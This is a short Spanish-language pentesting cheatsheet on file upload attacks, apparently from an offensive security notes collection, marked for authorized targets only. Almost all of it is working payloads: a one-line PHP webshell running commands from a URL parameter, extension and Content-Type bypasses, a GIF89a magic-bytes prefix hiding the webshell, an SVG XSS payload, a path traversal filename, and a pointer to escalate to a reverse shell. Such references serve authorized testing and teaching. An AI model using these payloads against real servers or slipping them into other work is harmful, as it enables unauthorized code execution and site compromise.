# Cheatsheet · File Upload

Explicación en `../../01-web/file-upload/file-upload.md`. **Solo sobre objetivos autorizados.**

## Webshell mínima (PHP)

```php
<?php system($_GET['c']); ?>
```

## Bypass de extensión

```
shell.php   shell.phtml   shell.php5   shell.pHp
shell.php.jpg        shell.jpg.php
shell.php%00.jpg     (null byte, legacy)
shell.php;.jpg       shell.php.       (trailing)
.htaccess            (para forzar ejecución de otras extensiones)
```

## Bypass de Content-Type

```
# en la request multipart, cambia:
Content-Type: image/png     (aunque el contenido sea PHP)
```

## Bypass de magic bytes

```
# antepón cabecera de imagen válida al payload
GIF89a;
<?php system($_GET['c']); ?>
```

## Otros vectores

```
# SVG con XSS
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
# nombre con path traversal
../../var/www/html/shell.php
```

## Notas

- Tras subir, localiza la URL del fichero y accede para ejecutar.
- Si ejecuta → pasa a reverse shell (ver por-fase/03-explotacion).
